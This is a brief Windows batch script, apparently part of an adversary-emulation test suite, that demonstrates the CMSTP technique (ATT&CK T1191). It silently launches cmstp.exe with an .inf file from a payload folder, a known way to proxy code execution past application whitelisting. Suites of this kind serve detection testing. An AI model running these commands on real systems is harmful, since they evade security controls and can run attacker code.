@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: CMSTP	(T1191)
ECHO.
ECHO [+] Executing 'CMSTP.EXE'
ECHO -------------------------------------------------------------------
cmstp.exe /s %PAYLOAD%\T1191\T1191.inf
cmstp.exe /s %PAYLOAD%\T1191\T1191.inf /au
ECHO.

